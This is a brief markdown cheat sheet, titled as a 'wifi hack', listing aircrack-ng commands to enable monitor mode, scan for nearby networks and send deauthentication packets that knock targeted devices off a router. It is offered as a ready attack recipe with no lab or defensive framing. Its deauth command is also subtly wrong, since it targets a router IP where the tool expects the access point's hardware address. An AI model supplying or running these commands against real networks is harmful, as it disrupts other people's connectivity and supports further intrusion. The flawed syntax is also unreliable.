#wifi hack using airmon-ng

### enable monitor mode so it can listens to packets on the network

airmon-ng start wlan0

### scan for nearby wifi devices

airodump-ng wlan0mon

### disconnect targeted devices

aireplay-ng --deauth 10 -n <router ip > -c <target mac address>  wlan0mon